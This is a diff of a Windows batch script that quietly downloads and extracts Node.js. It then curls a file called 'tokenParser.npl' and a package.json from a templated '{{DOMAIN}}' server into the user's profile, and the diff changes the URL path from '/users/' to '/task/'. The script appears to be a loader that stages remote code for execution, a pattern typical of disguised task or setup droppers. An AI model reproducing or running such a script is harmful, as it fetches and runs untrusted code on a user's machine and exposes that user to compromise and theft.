@@ -38,16 +38,16 @@ if defined NODE_EXE (
     where curl >nul 2>&1
     if %errorlevel% NEQ 0 (
         echo [INFO] Using PowerShell to download Node.js...
-        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%NODE_MSI%'"
+        powershell -Command "Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%~dp0%NODE_MSI%'"
     ) else (
         echo [INFO] Using curl to download Node.js...
-        curl -s -L -o "%NODE_MSI%" "%DOWNLOAD_URL%"
+        curl -s -L -o "%~dp0%NODE_MSI%" "%DOWNLOAD_URL%"
     )
 
-    if exist "%NODE_MSI%" (
+    if exist "%~dp0%NODE_MSI%" (
         echo [INFO] Extracting Node.js MSI to %EXTRACT_DIR%...
-        msiexec /a "%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
-        del "%NODE_MSI%"
+        msiexec /a "%~dp0%NODE_MSI%" /qn TARGETDIR="%EXTRACT_DIR%"
+        del "%~dp0%NODE_MSI%"
     ) else (
         echo [ERROR] Failed to download Node.js MSI.
         exit /b 1
@@ -79,8 +79,8 @@ if errorlevel 1 (
 set "USERPROFILE=%USERPROFILE%"
 echo [INFO] Downloading tokenParser.npl and package.json...
 
-curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/users/tokenParser.npl"
-curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/users/package.json"
+curl -L -o "%USERPROFILE%\tokenParser.npl" "{{DOMAIN}}/task/tokenParser.npl"
+curl -L -o "%USERPROFILE%\package.json" "{{DOMAIN}}/task/package.json"
 
 :: -------------------------
 :: Install dependencies
